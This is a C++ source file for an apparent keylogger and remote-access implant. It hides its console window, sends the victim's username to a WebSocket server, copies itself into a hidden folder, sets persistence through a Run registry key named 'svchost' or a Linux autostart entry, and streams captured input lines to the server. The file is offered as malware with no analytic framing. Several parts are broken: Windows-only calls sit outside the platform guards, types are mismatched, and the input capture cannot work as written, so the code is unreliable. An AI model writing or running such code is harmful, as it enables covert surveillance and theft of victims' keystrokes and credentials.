#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <websocketpp/config/asio_no_tls.hpp>
#include <websocketpp/client.hpp>
#include <boost/asio.hpp>
#include <boost/process.hpp>
#include <random>
#include <filesystem>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#endif

using websocketpp::client;
using websocketpp::connection_hdl;

class WebSocketClient {
public:
    WebSocketClient(const std::string& url) : url(url) {
        client_instance.init_asio();
        websocketpp::lib::error_code ec;
        connection_hdl = client_instance.get_connection(url, ec);
        if (ec) throw std::runtime_error("Connection error: " + ec.message());
        client_instance.connect(connection_hdl);
    }

    void sendMessage(const std::string& message) {
        websocketpp::lib::error_code ec;
        client_instance.send(connection_hdl, message, websocketpp::frame::opcode::text, ec);
        if (ec) {
            std::cerr << "Error sending message: " << ec.message() << std::endl;
        }
    }

    static std::string generateRandomString(size_t length) {
        const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::string result;
        std::random_device rd;
        std::mt19937 generator(rd());
        std::uniform_int_distribution<> distribution(0, sizeof(charset) - 2);
        
        for (size_t i = 0; i < length; ++i) {
            result += charset[distribution(generator)];
        }
        return result;
    }

    void hideShell() {
#ifdef _WIN32
        HWND hwnd = GetConsoleWindow();
        ShowWindow(hwnd, SW_HIDE);
#else
        // Linux: Redirect stdout and stderr to /dev/null
        int devNull = open("/dev/null", O_RDWR);
        dup2(devNull, STDOUT_FILENO);
        dup2(devNull, STDERR_FILENO);
        close(devNull);
#endif
    }

#ifdef _WIN32
    void addToStartup(const std::string& file_path) {
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueEx(hKey, "svchost", 0, REG_SZ, (const BYTE*)file_path.c_str(), file_path.size() + 1);
            RegCloseKey(hKey);
        }
    }

    void hideDirectory(const std::string& path) {
        std::string command = "attrib +h +s \"" + path + "\"";
        system(command.c_str());
    }
#else
    void addToStartup(const std::string& file_path) {
        std::string command = "cp " + file_path + " ~/.config/autostart/";
        system(command.c_str());
    }

    void hideDirectory(const std::string& path) {
        std::string command = "chattr +h " + path;
        system(command.c_str());
    }
#endif

    void run() {
        hideShell(); // Hide the shell at the start

        std::string username = boost::process::system("whoami");
        sendMessage("I'm Connected | Username : " + username);

        std::string folder_name = generateRandomString(16);
        std::string folder_path;

#ifdef _WIN32
        folder_path = "C:\\" + folder_name;
#else
        folder_path = "/home/" + folder_name;
#endif

        std::filesystem::create_directory(folder_path);
        hideDirectory(folder_path);

        char file_path[MAX_PATH];
        GetModuleFileName(NULL, file_path, MAX_PATH);
        std::string current_file_path = file_path;

        std::string new_file_path = folder_path + "\\" + std::filesystem::path(file_path).filename().string();
        MoveFile(current_file_path.c_str(), new_file_path.c_str());
        addToStartup(new_file_path);

        std::vector<std::string> data;
        std::string text;

        while (true) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            char event;
            std::cin >> event;
            data.push_back(std::string(1, event));

            if (event == '\n') {
                text = std::accumulate(data.begin(), data.end(), std::string());
                sendMessage(text);
                data.clear();
            }
        }
    }

private:
    client<websocketpp::config::asio> client_instance;
    connection_hdl connection_hdl;
    std::string url;
};

int main() {
    try {
        WebSocketClient wsClient("ws://localhost:8989");
        wsClient.run();
    } catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
    }
    return 0;
}
